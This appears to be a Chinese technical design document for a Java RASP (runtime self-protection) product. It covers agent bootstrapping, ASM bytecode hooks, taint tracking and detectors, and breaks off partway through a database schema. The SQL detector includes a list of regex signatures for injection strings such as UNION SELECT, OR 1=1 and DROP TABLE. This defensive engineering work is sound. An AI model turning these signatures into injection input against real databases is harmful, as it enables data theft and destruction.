# My-Java-RASP 技术设计文档

> **版本**: v1.0  
> **日期**: 2026-07-07  
> **作者**: RASP 项目组  
> **状态**: 设计阶段

---

## 目录

1. [项目概述](#一项目概述)
2. [总体架构](#二总体架构)
3. [模块设计](#三模块设计)
4. [Hook 系统设计](#四hook-系统设计)
5. [检测引擎设计](#五检测引擎设计)
6. [性能设计](#六性能设计)
7. [前端设计](#七前端设计)
8. [测试策略](#八测试策略)
9. [部署方案](#九部署方案)
10. [附录](#十附录)

---

## 一、项目概述

### 1.1 项目目标

构建一个**生产级 Java RASP 系统**，能够：

1. 通过 Java Agent 技术在运行时注入安全检测逻辑
2. 覆盖 10+ 类常见 Web 攻击的实时检测和阻断
3. 提供管理后台进行策略配置、告警查看、Agent 管理
4. 支持 premain 和 agentmain 两种部署模式
5. 兼容 Java 8+，适配 Tomcat/Jetty/Undertow 等主流容器
6. 提供完整的测试靶场和测试报告

### 1.2 项目结构

```
my-java-rasp/
├── rasp-agent/          # Java Agent 入口模块
│   ├── src/main/java/com/rasp/agent/
│   │   ├── RaspPremain.java          # premain 入口
│   │   ├── RaspAgentMain.java        # agentmain 入口（动态attach）
│   │   ├── RaspClassFileTransformer.java  # 核心Transformer
│   │   └── bootstrap/
│   │       ├── AgentBootstrap.java   # Agent 启动引导
│   │       └── ClassLoaderHelper.java # 类加载器工具
│   └── src/main/resources/
│       └── META-INF/MANIFEST.MF
│
├── rasp-core/           # 核心引擎模块
│   ├── src/main/java/com/rasp/core/
│   │   ├── context/
│   │   │   ├── RaspContext.java          # 请求上下文
│   │   │   ├── RaspContextManager.java   # 上下文管理器（ThreadLocal）
│   │   │   └── RaspRequest.java          # 请求信息封装
│   │   ├── hook/
│   │   │   ├── HookRegistry.java         # Hook 注册中心
│   │   │   ├── HookPoint.java            # Hook 点定义
│   │   │   ├── HookResult.java           # Hook 执行结果
│   │   │   └── HookType.java             # Hook 类型枚举
│   │   ├── transformer/
│   │   │   ├── AbstractMethodVisitor.java # 方法访问器基类
│   │   │   ├── HookMethodAdapter.java    # 方法插桩适配器
│   │   │   └── ClassRewritePolicy.java   # 类重写策略
│   │   ├── engine/
│   │   │   ├── DetectEngine.java         # 检测引擎接口
│   │   │   ├── RuleEngine.java           # 规则引擎实现
│   │   │   ├── TaintTracker.java         # 污点追踪实现
│   │   │   └── DecisionMaker.java        # 决策器（多引擎投票）
│   │   ├── config/
│   │   │   ├── RaspConfig.java           # 配置接口
│   │   │   ├── RaspConfigLoader.java     # 配置加载器
│   │   │   └── RaspConfigWatcher.java    # 配置热更新
│   │   ├── log/
│   │   │   ├── RaspLogger.java           # 轻量日志接口
│   │   │   ├── RaspLogFormatter.java     # 日志格式化
│   │   │   └── AlarmLogger.java          # 告警日志（独立文件）
│   │   └── util/
│   │       ├── ReflectUtils.java         # 反射工具
│   │       ├── StackTraceUtils.java      # 调用栈分析
│   │       └── ThreadUtils.java          # 线程工具
│   └── src/main/resources/
│       └── rasp-default.yml
│
├── rasp-detector/       # 检测器模块（各攻击类型）
│   ├── src/main/java/com/rasp/detector/
│   │   ├── AbstractDetector.java         # 检测器基类
│   │   ├── sql/
│   │   │   ├── SqlDetector.java          # SQL注入检测器
│   │   │   ├── SqlParser.java            # SQL 词法分析
│   │   │   └── SqlInjectionPatterns.java # SQL注入模式库
│   │   ├── command/
│   │   │   ├── CommandDetector.java      # 命令执行检测器
│   │   │   └── CommandWhitelist.java     # 命令白名单
│   │   ├── deserialization/
│   │   │   ├── DeserializationDetector.java # 反序列化检测器
│   │   │   └── GadgetClassBlacklist.java # Gadget类黑名单
│   │   ├── file/
│   │   │   ├── FileDetector.java         # 文件操作检测器
│   │   │   └── PathTraversalDetector.java # 路径遍历检测
│   │   ├── ssrf/
│   │   │   ├── SsrfDetector.java         # SSRF检测器
│   │   │   └── IpChecker.java            # IP 检查工具
│   │   ├── jndi/
│   │   │   └── JndiDetector.java         # JNDI注入检测器
│   │   ├── expression/
│   │   │   ├── ExpressionDetector.java   # 表达式注入检测器
│   │   │   └── DangerousFuncChecker.java # 危险函数检查
│   │   ├── xss/
│   │   │   └── XssDetector.java          # XSS检测器
│   │   └── webshell/
│   │       ├── WebshellDetector.java     # WebShell检测器
│   │       └── MemoryShellDetector.java  # 内存马检测器
│   └── pom.xml
│
├── rasp-hooks/          # Hook 实现模块
│   ├── src/main/java/com/rasp/hooks/
│   │   ├── sql/
│   │   │   ├── StatementHook.java        # Statement Hook
│   │   │   └── PreparedStatementHook.java # PreparedStatement Hook
│   │   ├── command/
│   │   │   ├── ProcessBuilderHook.java   # ProcessBuilder Hook
│   │   │   └── RuntimeExecHook.java      # Runtime.exec Hook
│   │   ├── deserialization/
│   │   │   └── ObjectInputStreamHook.java # 反序列化 Hook
│   │   ├── file/
│   │   │   ├── FileInputStreamHook.java  # 文件读 Hook
│   │   │   ├── FileOutputStreamHook.java # 文件写 Hook
│   │   │   └── NioFileHook.java          # NIO文件 Hook
│   │   ├── ssrf/
│   │   │   └── UrlConnectionHook.java    # URL连接 Hook
│   │   ├── jndi/
│   │   │   └── InitialContextHook.java   # JNDI Hook
│   │   ├── expression/
│   │   │   ├── SpelHook.java             # SpEL Hook
│   │   │   └── OgnlHook.java             # OGNL Hook
│   │   ├── servlet/
│   │   │   ├── ServletServiceHook.java   # Servlet 入口 Hook
│   │   │   └── FilterDoFilterHook.java   # Filter 入口 Hook
│   │   ├── thread/
│   │   │   └── ThreadStartHook.java      # 线程创建 Hook（防绕过）
│   │   ├── reflect/
│   │   │   └── ReflectionHook.java       # 反射 Hook（防绕过）
│   │   └── classloader/
│   │       └── ClassLoaderHook.java      # 类加载 Hook（内存马检测）
│   └── pom.xml
│
├── rasp-commons/        # 公共模块
│   ├── src/main/java/com/rasp/commons/
│   │   ├── AttackType.java               # 攻击类型枚举
│   │   ├── Severity.java                 # 严重程度枚举
│   │   ├── AlarmEvent.java               # 告警事件 POJO
│   │   ├── AlarmLevel.java               # 告警级别
│   │   ├── SecurityPolicy.java           # 安全策略
│   │   └── constants/
│   │       └── RaspConstants.java        # 全局常量
│   └── pom.xml
│
├── rasp-server/         # 管理后台服务
│   ├── src/main/java/com/rasp/server/
│   │   ├── RaspServerApplication.java    # Spring Boot 入口
│   │   ├── controller/
│   │   │   ├── DashboardController.java  # 大盘API
│   │   │   ├── AlarmController.java      # 告警API
│   │   │   ├── AgentController.java      # Agent管理API
│   │   │   ├── PolicyController.java     # 策略管理API
│   │   │   └── ConfigController.java     # 配置管理API
│   │   ├── service/
│   │   │   ├── AlarmService.java
│   │   │   ├── AgentService.java
│   │   │   ├── PolicyService.java
│   │   │   └── DashboardService.java
│   │   ├── repository/
│   │   │   ├── AlarmRepository.java
│   │   │   ├── AgentRepository.java
│   │   │   └── PolicyRepository.java
│   │   ├── entity/
│   │   │   ├── AlarmRecord.java
│   │   │   ├── AgentInfo.java
│   │   │   └── PolicyRule.java
│   │   └── config/
│   │       ├── SecurityConfig.java
│   │       └── DbConfig.java
│   └── src/main/resources/
│       ├── application.yml
│       └── db/migration/              # Flyway 迁移脚本
│
├── rasp-web/            # 前端管理平台
│   ├── src/
│   │   ├── pages/
│   │   │   ├── Dashboard.tsx         # 安全大盘
│   │   │   ├── AlarmList.tsx         # 告警列表
│   │   │   ├── AlarmDetail.tsx       # 告警详情
│   │   │   ├── AgentList.tsx         # Agent 列表
│   │   │   ├── PolicyEditor.tsx      # 策略编辑
│   │   │   └── Settings.tsx          # 系统设置
│   │   ├── components/
│   │   │   ├── AttackChart.tsx       # 攻击趋势图
│   │   │   ├── SeverityBadge.tsx     # 严重程度标签
│   │   │   └── ...
│   │   ├── services/
│   │   │   └── api.ts               # API 封装
│   │   └── App.tsx
│   ├── package.json
│   └── vite.config.ts
│
├── rasp-test-target/    # 测试靶场
│   ├── src/main/java/com/rasp/test/
│   │   ├── TestTargetApplication.java
│   │   ├── controller/
│   │   │   ├── SqlInjectionController.java
│   │   │   ├── CommandInjectionController.java
│   │   │   ├── DeserializationController.java
│   │   │   ├── FileOperationController.java
│   │   │   ├── SsrfController.java
│   │   │   ├── JndiController.java
│   │   │   ├── ExpressionController.java
│   │   │   ├── XssController.java
│   │   │   └── WebshellController.java
│   │   └── model/
│   └── src/main/resources/templates/
│
├── docs/                # 文档
│   ├── research.md       # 调研文档
│   ├── design.md         # 设计文档（本文档）
│   ├── test-report.md    # 测试报告
│   └── acceptance.md     # 验收报告
│
├── pom.xml              # 父 POM（多模块管理）
├── .gitignore
└── README.md
```

---

## 二、总体架构

### 2.1 系统架构图

```
                              ┌─────────────────────────────┐
                              │      rasp-web (React)        │
                              │  安全大盘 / 告警 / 策略管理    │
                              └──────────────┬──────────────┘
                                             │ HTTP API
                              ┌──────────────▼──────────────┐
                              │   rasp-server (Spring Boot)  │
                              │   API / 策略存储 / 告警聚合  │
                              └──────┬───────────┬──────────┘
                                     │           │
                          心跳上报   │           │ 策略下发
                                     │           │
                    ┌────────────────▼──┐  ┌────▼────────────────┐
                    │   被保护应用 #1    │  │   被保护应用 #2      │
                    │                   │  │                     │
                    │  ┌─────────────┐  │  │  ┌─────────────┐    │
                    │  │ rasp-agent  │  │  │  │ rasp-agent  │    │
                    │  │  (premain)  │  │  │  │  (attach)   │    │
                    │  └──────┬──────┘  │  │  └──────┬──────┘    │
                    │         │         │  │         │           │
                    │  ┌──────▼──────┐  │  │  ┌──────▼──────┐    │
                    │  │ rasp-core   │  │  │  │ rasp-core   │    │
                    │  │ transform   │  │  │  │ transform   │    │
                    │  │ hook engine │  │  │  │ hook engine │    │
                    │  └──────┬──────┘  │  │  └──────┬──────┘    │
                    │         │         │  │         │           │
                    │  ┌──────▼──────┐  │  │  ┌──────▼──────┐    │
                    │  │ rasp-detector│ │  │  │ rasp-detector│   │
                    │  │ 规则+污点    │  │  │  │ 规则+污点    │   │
                    │  └─────────────┘  │  │  └─────────────┘    │
                    │                   │  │                     │
                    │   业务应用代码     │  │   业务应用代码      │
                    └───────────────────┘  └─────────────────────┘
```

### 2.2 核心数据流

```
┌──────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐
│ HTTP请求  │───▶│  Servlet  │───▶│  业务代码  │───▶│  敏感API  │───▶│  返回值   │
│          │    │  Hook    │    │          │    │  Hook    │    │         │
└──────────┘    └─────┬────┘    └──────────┘    └─────┬────┘    └──────────┘
                      │                               │
                      ▼                               ▼
               ┌──────────────┐              ┌──────────────┐
               │ RaspContext   │              │ DetectEngine  │
               │ .create()    │              │ .check()     │
               │ ThreadLocal   │              │              │
               │   .set()     │              │  ┌─────────┐ │
               └──────────────┘              │  │RuleEng  │ │
                      │                      │  │匹配检测  │ │
                      │                      │  ├─────────┤ │
                      │                      │  │TaintTra │ │
                      │              ┌───────│  │污点追踪  │ │
                      │              │       │  ├─────────┤ │
                      ▼              │       │  │Decision │ │
               ┌──────────────┐     │       │  │决策器    │ │
               │ RaspContext   │     │       │  └─────────┘ │
               │ .get()       │◄────┘       └──────┬───────┘
               └──────────────┘                    │
                                                   ▼
                      ┌──────────┐     ┌──────────────────────┐
                      │ ThreadL.  │     │  HookResult           │
                      │ .remove() │     │  RETURN / THROW /     │
                      └──────────┘     │  REPLACE               │
                                       │                       │
                                       │  AlarmLogger.log()     │
                                       │  (异步写入告警日志)     │
                                       └───────────────────────┘
```

### 2.3 模块依赖关系

```
rasp-commons (无外部依赖)
     ↑
     ├── rasp-core (依赖 commons)
     │       ↑
     │       ├── rasp-detector (依赖 core + commons)
     │       │
     │       └── rasp-hooks (依赖 core + detector + commons)
     │
     └── rasp-agent (依赖 core + hooks + detector + commons)
                      │
                      └──▶ 被保护应用（-javaagent 加载）
                                    │
                                    │ 通过 HTTP 通信
                                    ▼
                              rasp-server (Spring Boot)
                                    │
                                    ▼
                              rasp-web (React)
```

---

## 三、模块设计（核心类级别）

### 3.1 rasp-agent 模块

#### 3.1.1 AgentBootstrap - Agent 启动引导

```java
/**
 * Agent 启动引导器
 * 
 * 职责：
 * 1. 解析启动参数（配置路径、日志路径、server地址等）
 * 2. 初始化日志系统（避免与业务 log4j/logback 冲突，使用独立的 Slf4j Simple）
 * 3. 加载配置文件 rasp.yml
 * 4. 初始化各子系统（Context、Detector、Hook）
 * 5. 注册 ClassFileTransformer
 * 6. 对已加载的核心类执行 retransform
 * 7. 启动心跳线程（向 rasp-server 上报 Agent 状态）
 * 8. 开启全局 Hook 开关
 * 
 * 关键设计决策：
 * - BootstrapClassLoader 挂载：对于由 Bootstrap 加载的类（java.io.* 等），
 *   需要将 rasp-agent.jar 路径通过 Instrumentation.appendToBootstrapClassLoaderSearch()
 *   添加到 Boot ClassPath，否则 Hook 代码无法访问 agent 中的类
 * - 启动阶段安全：Transformer 注册后立刻生效，但全局开关默认关闭，
 *   等所有初始化完成后再打开，避免启动过程中的误报
 * - 优雅降级：初始化失败不应导致应用启动失败，记录错误日志后降级运行
 */
```

#### 3.1.2 ClassLoaderHelper

```java
/**
 * 类加载器隔离工具
 * 
 * 问题：Agent 和业务应用使用不同的 ClassLoader，直接引用会 ClassNotFoundException
 * 解决：
 * 1. 通过 Instrumentation.appendToBootstrapClassLoaderSearch() 将 agent jar 暴露给 Bootstrap
 * 2. 所有共享接口定义在 rasp-commons 中，作为"桥接模块"
 * 3. Hook 代码中避免使用业务类（如具体 JDBC 驱动类），使用接口/反射
 * 4. 将 agent jar 路径注入到系统属性，供子 ClassLoader 查找
 */
```

#### 3.1.3 RaspClassFileTransformer

```java
/**
 * 核心 ClassFileTransformer
 * 
 * 设计要点：
 * 1. 快速过滤：对所有加载的类先做名称匹配（HashSet 查找），非 Hook 目标直接返回 null
 *    注意：返回 null 代表不修改字节码，此操作必须在 <1ms 内完成
 * 2. 白名单模式：只对明确注册的 Target Class 进行字节码增强
 * 3. 双层缓存：
 *    - L1: className → whetherToHook (HashSet, O(1))
 *    - L2: 已处理的类签名缓存（避免重复 ASM 解析）
 * 4. 异常隔离：单个类的 transform 失败不影响其他类的加载
 * 
 * ASM 版本选择：
 * - 使用 ASM 9.7（支持 Java 22 class file format，向下兼容 Java 8）
 * - COMPUTE_FRAMES 必须开启，否则验证器可能拒绝修改后的类
 * - COMPUTE_MAXS 也建议开启，简化栈帧计算
 */
public class RaspClassFileTransformer implements ClassFileTransformer {
    
    // L1 缓存：需要 Hook 的类名集合
    private final Set<String> hookTargets;
    
    // L2 缓存：已处理类的指纹
    private final Map<String, String> processedClassHashes;
    
    @Override
    public byte[] transform(ClassLoader loader, String className,
            Class<?> classBeingRedefined, ProtectionDomain protectionDomain,
            byte[] classfileBuffer) {
        
        // 快速过滤：非目标类直接返回 null
        if (!hookTargets.contains(className)) {
            return null;
        }
        
        // 检查是否已处理（防止重复 transform）
        String hash = computeHash(classfileBuffer);
        if (hash.equals(processedClassHashes.get(className))) {
            return null;
        }
        
        try {
            // ASM 字节码增强
            ClassReader cr = new ClassReader(classfileBuffer);
            ClassWriter cw = new ClassWriter(cr, 
                ClassWriter.COMPUTE_MAXS | ClassWriter.COMPUTE_FRAMES);
            HookClassVisitor visitor = new HookClassVisitor(
                ASM9, cw, className, getHookPoints(className));
            cr.accept(visitor, ClassReader.EXPAND_FRAMES);
            
            byte[] modified = cw.toByteArray();
            processedClassHashes.put(className, hash);
            return modified;
            
        } catch (Exception e) {
            // 异常隔离：记录日志，返回 null（保持原始类）
            RaspLogger.error("Failed to transform class: " + className, e);
            return null;
        }
    }
}
```

### 3.2 rasp-core 模块

#### 3.2.1 RaspContext - 请求上下文（ThreadLocal）

```java
/**
 * RASP 请求上下文
 * 
 * 存储在 ThreadLocal 中，贯穿整个请求生命周期。
 * 
 * 为什么用 ThreadLocal 而非传参：
 * 1. Hook 点散布在应用各处，无法通过参数传递
 * 2. 同一个请求的处理在同一线程内（Servlet 模型保证）
 * 3. 需要与 Spring Security 等框架的 SecurityContextHolder 模式兼容
 * 
 * 内存泄漏防护：
 * - 必须在 Filter/Servlet 出口强制 remove()
 * - 使用 try-finally 保证异常情况下也能清理
 * - 定期扫描：超过一定时间的残留 Context 自动清理（兜底）
 * 
 * 线程池兼容（Tomcat 等使用线程池）：
 * - 请求开始：ThreadLocal.set()（覆盖旧值，不会有残留）
 * - 请求结束：ThreadLocal.remove()（必须，否则下一个请求可能读到旧 Context）
 */
public class RaspContext {
    
    private static final ThreadLocal<RaspContext> CONTEXT_HOLDER = new ThreadLocal<>();
    
    // --- 请求基础信息 ---
    private final String requestId;           // 全局唯一请求 ID (UUID)
    private final long createTime;            // 请求开始时间 (System.nanoTime())
    private String remoteAddr;                // 客户端 IP
    private String requestUri;                // 请求 URI
    private String httpMethod;                // GET/POST/...
    private Map<String, String[]> parameters; // 请求参数（含URL和Body）
    private Map<String, String> headers;      // 请求头
    private Map<String, String> cookies;      // Cookie
    
    // --- Hook 触发记录 ---
    private final List<HookEvent> hookEvents; // 当前请求触发的所有 Hook
    private final List<AlarmEvent> alarms;     // 检测到的攻击事件
    
    // --- 检测引擎状态 ---
    private boolean detectionsEnabled;        // 当前请求是否开启检测
    private Set<String> trustedSources;       // 可信来源标记
    
    // 工厂方法
    public static RaspContext create(Object request, Object response) {
        RaspContext ctx = new RaspContext();
        // 从 HttpServletRequest 提取信息...
        CONTEXT_HOLDER.set(ctx);
        return ctx;
    }
    
    public static RaspContext get() {
        return CONTEXT_HOLDER.get();
    }
    
    public static void destroy() {
        RaspContext ctx = CONTEXT_HOLDER.get();
        if (ctx != null) {
            ctx.cleanup();
            CONTEXT_HOLDER.remove();
        }
    }
    
    /**
     * 参数关联检测核心方法
     * 检查某个 API 参数是否包含在 HTTP 请求参数中
     */
    public boolean isParamTainted(String apiArg) {
        if (apiArg == null || apiArg.isEmpty()) return false;
        for (String[] values : parameters.values()) {
            for (String v : values) {
                if (v != null && v.length() > 3 && apiArg.contains(v)) {
                    return true; // 输入参数流入了 API 调用
                }
            }
        }
        return false;
    }
}
```

#### 3.2.2 HookRegistry - Hook 注册中心

```java
/**
 * Hook 注册中心和匹配引擎
 * 
 * 设计决策：
 * 1. 使用拓扑排序保证多个 Hook 对同一类的修改顺序
 * 2. 按 className 建立索引，快速查找
 * 3. 支持运行时新增/禁用 Hook（热插拔）
 * 
 * Hook 注册示例：
 * registry.register(
 *     HookPoint.builder()
 *         .className("java.lang.ProcessBuilder")
 *         .methodName("start")
 *         .methodDesc("()Ljava/lang/Process;")
 *         .hookType(HookType.BEFORE)  // 方法前/后/环绕
 *         .hookHandler(new ProcessBuilderHook())
 *         .priority(HookPriority.HIGH)
 *         .build()
 * );
 */
public class HookRegistry {
    
    // className → List<HookPoint> 索引
    private final Map<String, List<HookPoint>> hookIndex;
    
    public void register(HookPoint hookPoint) {
        hookIndex.computeIfAbsent(
            hookPoint.getClassName(), 
            k -> new CopyOnWriteArrayList<>()  // 支持并发安全的动态添加
        ).add(hookPoint);
        
        // 按优先级排序
        hookIndex.get(hookPoint.getClassName())
            .sort(Comparator.comparing(HookPoint::getPriority));
    }
    
    /**
     * 获取某个类的所有 Hook 点
     */
    public List<HookPoint> getHookPoints(String className) {
        return hookIndex.getOrDefault(className, Collections.emptyList());
    }
}
```

### 3.3 rasp-detector 模块

#### 3.3.1 检测器接口设计

```java
/**
 * 检测器抽象基类
 * 
 * 模板方法模式：所有检测器遵循统一流程
 * 
 * 1. preCheck()  → 快速过滤（白名单、是否请求线程等）
 * 2. doDetect()  → 核心检测逻辑（子类实现）
 * 3. postCheck() → 后处理（记录日志、更新统计）
 */
public abstract class AbstractDetector {
    
    /**
     * 检测入口
     * 
     * @param event Hook 事件（包含 Hook 点信息、方法参数等）
     * @param context 当前请求上下文
     * @return 检测结果
     */
    public final DetectResult detect(HookEvent event, RaspContext context) {
        // 1. 快速过滤
        if (!preCheck(event, context)) {
            return DetectResult.PASS;
        }
        
        // 2. 核心检测
        DetectResult result = doDetect(event, context);
        
        // 3. 后处理
        postCheck(event, context, result);
        
        return result;
    }
    
    protected boolean preCheck(HookEvent event, RaspContext context) {
        // 默认：非请求线程跳过（减少性能开销）
        if (context == null && !isGlobalDetect()) {
            return false;
        }
        return true;
    }
    
    /**
     * 子类实现具体检测逻辑
     */
    protected abstract DetectResult doDetect(HookEvent event, RaspContext context);
    
    /**
     * 是否需要全局检测（不论是否在请求线程中）
     * 命令执行、内存马检测等需要全局开启
     */
    protected boolean isGlobalDetect() {
        return false;
    }
}

/**
 * 检测结果
 */
public class DetectResult {
    public enum Action {
        ALLOW,    // 放行
        BLOCK,    // 阻断
        ALERT,    // 仅告警（不阻断）
        REPLACE   // 替换返回值（如 SSRF 返回 mock 对象）
    }
    
    private final Action action;
    private final AttackType attackType;
    private final Severity severity;
    private final String message;         // 人类可读的告警消息
    private final Map<String, Object> evidence; // 证据（用于回溯分析）
}
```

#### 3.3.2 SqlDetector 详细设计

```java
/**
 * SQL 注入检测器
 * 
 * 三级检测策略：
 * Level 1 - 特征匹配（快，高召回）
 *   - 正则匹配 SQL 注入关键字：UNION SELECT, OR 1=1, DROP TABLE 等
 *   - 适合快速拦截明显攻击
 * 
 * Level 2 - 参数关联（准，核心能力）
 *   - 提取 SQL 中的字符串字面量
 *   - 检查是否包含 HTTP 请求参数值
 *   - 如果参数值原样出现在 SQL 中 → 高度可疑
 * 
 * Level 3 - 语法分析（精，低误报）
 *   - 使用 JSqlParser 构建 SQL AST
 *   - 检查是否存在非预期的查询结构变化
 *   - 适合低误报要求的场景（如金融系统）
 * 
 * 性能优化：
 * - Level 1 使用预编译正则（Pattern 对象缓存）
 * - Level 2 使用字符串哈希做快速排除
 * - Level 3 仅在 Level 2 命中时触发（按需解析）
 */
public class SqlDetector extends AbstractDetector {
    
    // Level 1: 预编译 SQL 注入特征正则
    private static final Pattern[] SQL_INJECTION_PATTERNS = {
        Pattern.compile("(?i)(\\bUNION\\b.+\\bSELECT\\b)"),
        Pattern.compile("(?i)(\\bOR\\b\\s+['\"]?\\d+['\"]?\\s*=\\s*['\"]?\\d+['\"]?)"),
        Pattern.compile("(?i)(\\bDROP\\s+TABLE\\b)"),
        Pattern.compile("(?i)(\\bINSERT\\s+INTO\\b.*\\bVALUES\\b)"),
        Pattern.compile("(?i)(--[^\\n]*$)"),          // SQL 注释截断
        Pattern.compile("(?i)(\\bEXEC\\b.*\\bsp_)"),  // MSSQL 存储过程
        Pattern.compile("(?i)(\\bINFORMATION_SCHEMA\\b)"),
    };
    
    // Level 2: SQL 字面量提取正则
    private static final Pattern STRING_LITERAL = 
        Pattern.compile("'([^']*)'");
    
    @Override
    protected DetectResult doDetect(HookEvent event, RaspContext context) {
        String sql = (String) event.getArgument("sql");
        if (sql == null || sql.isEmpty()) return DetectResult.PASS;
        
        // Level 1: 特征匹配
        for (Pattern p : SQL_INJECTION_PATTERNS) {
            if (p.matcher(sql).find()) {
                return buildResult(Action.BLOCK, AttackType.SQL_INJECTION,
                    Severity.HIGH, 
                    "SQL injection detected: pattern matched - " + p.pattern(),
                    Map.of("sql", sql.substring(0, Math.min(sql.length(), 500)))
                );
            }
        }
        
        // Level 2: 参数关联
        if (context != null && context.getParameters() != null) {
            Matcher m = STRING_LITERAL.matcher(sql);
            while (m.find()) {
                String literal = m.group(1);
                if (literal.length() > 3 && context.isParamTainted(literal)) {
                    // 请求参数值原样出现在 SQL 中
                    return buildResult(Action.BLOCK, AttackType.SQL_INJECTION,
                        Severity.HIGH,
                        "SQL injection: request parameter value found in SQL literal",
                        Map.of("tainted_literal", literal, "sql", sql)
                    );
                }
            }
        }
        
        return DetectResult.PASS;
    }
}
```

#### 3.3.3 TaintTracker - 污点追踪器

```java
/**
 * 污点追踪引擎
 * 
 * 核心思想：标记来自 HTTP 请求的数据为"污点"，追踪其在应用中的流动。
 * 当污点数据流入敏感 API 调用时触发告警。
 * 
 * 实现方案：
 * 1. 轻量级污点标记（不修改数据对象本身）
 * 2. 使用 IdentityHashMap 建立 对象引用 → 污点来源 的映射
 * 3. 在字符串操作 Hook 点传播污点标记（String.concat, substring, +运算符 等）
 * 
 * 污点传播规则：
 * - Source: HttpServletRequest.getParameter() → 标记返回值
 * - Propagate: String.concat(), substring(), StringBuilder.toString() → 传播标记
 * - Sink: JDBC.execute(), ProcessBuilder.start(), FileInputStream.<init>() → 检查标记
 * 
 * 设计决策：为什么不用字节码级别的 Taint 分析？
 * - 全量污点追踪对性能影响大（每个 String 操作都要插桩）
 * - Java 的 String 是不可变对象，可以在构造时传播标记
 * - 使用 WeakHashMap 避免内存泄漏（GC 时自动清理）
 * 
 * 与参数关联检测的互补：
 * - 参数关联：检测"请求参数值是否直接出现在 API 参数中"，简单高效
 * - 污点追踪：检测"请求参数值经过变换后是否流入 API"，更全面但开销大
 * - 默认启用参数关联，污点追踪可选开启（高安全要求场景）
 */
public class TaintTracker {
    
    // 使用 WeakReference 避免内存泄漏
    private static final Map<Object, Set<TaintSource>> taintMap = 
        Collections.synchronizedMap(new WeakHashMap<>());
    
    /**
     * 标记对象为污点
     */
    public static void markTaint(Object obj, TaintSource source) {
        if (obj == null) return;
        taintMap.computeIfAbsent(obj, k -> new HashSet<>()).add(source);
    }
    
    /**
     * 传播污点到新对象（如 substring 的结果）
     */
    public static void propagateTaint(Object from, Object to) {
        Set<TaintSource> sources = taintMap.get(from);
        if (sources != null) {
            taintMap.put(to, new HashSet<>(sources));
        }
    }
    
    /**
     * 检查对象是否为污点
     */
    public static boolean isTainted(Object obj) {
        return taintMap.containsKey(obj);
    }
}

/**
 * 污点来源
 */
public class TaintSource {
    private final String sourceType;  // "HTTP_PARAM", "HTTP_HEADER", "HTTP_COOKIE"
    private final String sourceName;  // 具体参数名
    private final String requestId;   // 关联的请求 ID
}
```

### 3.4 rasp-hooks 模块

#### 3.4.1 Hook 的 ASM 实现模式

```java
/**
 * ASM MethodVisitor 扩展 - 在方法入口插入检测代码
 * 
 * 字节码注入模式：
 * 
 * 原始方法：
 *   public ReturnType methodName(ArgType1 arg1, ArgType2 arg2) {
 *       // 原始代码 ...
 *       return result;
 *   }
 * 
 * 注入后（伪代码）：
 *   public ReturnType methodName(ArgType1 arg1, ArgType2 arg2) {
 *       // ===== 注入开始 =====
 *       if (RaspGuard.shouldCheck()) {
 *           Object result = RaspGuard.onMethodEnter(
 *               "ClassName", "methodName", 
 *               new Object[]{arg1, arg2}, this
 *           );
 *           if (result == RaspGuard.BLOCK) {
 *               throw new SecurityException("Blocked by RASP");
 *           }
 *       }
 *       // ===== 注入结束 =====
 *       
 *       // 原始代码 ...
 *       return result;
 *   }
 * 
 * ASM 实现要点：
 * 1. 必须正确处理 long/double 类型（占用两个本地变量槽）
 * 2. 异常表（try-catch）需要手动构建
 * 3. 本地变量表（LocalVariableTable）需要更新
 * 4. LineNumberTable 可忽略（调试信息，不影响运行）
 * 5. 使用 COMPUTE_FRAMES 自动计算栈帧（必须）
 */
public class HookMethodAdapter extends AdviceAdapter {
    
    private final String className;
    private final String methodName;
    private final HookPoint hookPoint;
    
    @Override
    protected void onMethodEnter() {
        if (hookPoint.getType() != HookType.BEFORE) return;
        
        // 1. 加载 RaspGuard 类引用到操作数栈
        // 2. 构建参数数组
        // 3. 调用 RaspGuard.onMethodEnter()
        // 4. 检查返回值，决定是否阻断
        
        Label continueLabel = new Label();
        
        // 调用 RaspGuard.shouldCheck()
        mv.visitMethodInsn(INVOKESTATIC, 
            "com/rasp/core/hook/RaspGuard",
            "shouldCheck", "()Z", false);
        mv.visitJumpInsn(IFEQ, continueLabel); // 如果不需要检测，跳过
        
        // 构建 Object[] 参数数组
        // ...（省略详细的 ASM 指令序列）
        
        // 调用检测入口
        mv.visitMethodInsn(INVOKESTATIC,
            "com/rasp/core/hook/RaspGuard",
            "onMethodEnter",
            "(Ljava/lang/String;Ljava/lang/String;[Ljava/lang/Object;Ljava/lang/Object;)I",
            false);
        
        // 判断返回值：如果是 BLOCK，跳转到异常抛出
        mv.visitInsn(ICONST_2); // BLOCK = 2
        mv.visitJumpInsn(IF_ICMPNE, continueLabel);
        
        // 抛出 SecurityException
        mv.visitTypeInsn(NEW, "java/lang/SecurityException");
        mv.visitInsn(DUP);
        mv.visitLdcInsn("Operation blocked by RASP");
        mv.visitMethodInsn(INVOKESPECIAL, "java/lang/SecurityException",
            "<init>", "(Ljava/lang/String;)V", false);
        mv.visitInsn(ATHROW);
        
        mv.visitLabel(continueLabel);
    }
}
```

### 3.5 rasp-server 模块

#### 3.5.1 数据库设计

```sql
-- 告警记录表
CREATE TABLE rasp_alarms (
    id          BIGINT AUTO_INCREMENT PRIMARY KEY,
    alarm_id    VARCHAR(64)     NOT NULL UNIQUE COMMENT '告警唯一标识',
    app_name    VARCHAR(128)    NOT NULL COMMENT '应用名称',
    agent_id    VARCHAR(64)     NOT NULL COMMENT 'Agent标识',
    attack_type VARCHAR(32)     NOT NULL COMMENT '攻击类型(SQL_INJECTION/CMD_INJECTION/...)',
    severity    VARCHAR(16)     NOT NULL COMMENT '严重程度(HIGH/MEDIUM/LOW)',
    action      VARCHAR(16)     NOT NULL COMMENT '处理动作(BLOCK/ALERT)',
    message     TEXT            NOT NULL COMMENT '告警描述',
    evidence    TEXT            COMMENT '证据JSON(含SQL语句/命令等)',
    request_uri VARCHAR(512)    COMMENT '请求URI',
    remote_addr VARCHAR(64)     COMMENT '客户端IP',
    stack_trace TEXT            COMMENT '调用栈',
    created_at  TIMESTAMP       NOT NULL DEFAULT CURRENT_TIMESTAMP,
    
    INDEX idx_app_name (app_name),
    INDEX idx_agent_id (agent_id),
    INDEX idx_attack_type (attack_type),
    INDEX idx_severity (severity),
    INDEX idx_created_at (created_at)
);

-- Agent 注册表
CREATE TABLE rasp_agents (
    id          BIGINT AUTO_INCREMENT PRIMARY KEY,
